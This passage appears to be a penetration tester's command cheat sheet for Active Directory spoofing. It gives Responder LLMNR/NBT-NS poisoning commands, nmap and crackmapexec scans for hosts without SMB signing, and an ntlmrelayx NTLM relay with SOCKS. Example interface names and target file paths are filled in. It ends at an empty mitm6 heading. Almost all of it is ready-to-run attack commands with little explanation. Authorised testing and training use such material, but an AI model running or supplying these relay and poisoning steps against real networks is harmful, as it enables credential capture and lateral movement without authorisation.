# Spoofing

## Responder - LLMNR Poisoning

```
responder-http-on
responder-smb-on
responder -I <interface> -r -d -w
```

= interface: enp0s31f6

## SMB signing disabled - nmap

```
nmap -Pn --script smb-security-mode -p445 <target>
```

= target: ./targets/domain/computers.txt

## SMB signing disabled - cme

```
cme smb <target> --gen-relay-list <output_file>
```

= target: ./targets/domain/computers.txt

## Responder - Relay

```
responder-http-off
responder-smb-off
responder -I <interface> -r -d -w
```

= interface: enp0s31f6

## NTLM Relay with SOCKS (SMB)

```
ntlmrelayx -tf <targets_file> -socks -smb2support
```

= targets_file: ./targets/domain/relay_targets_computers.txt

## mitm6 for NTLM Relay
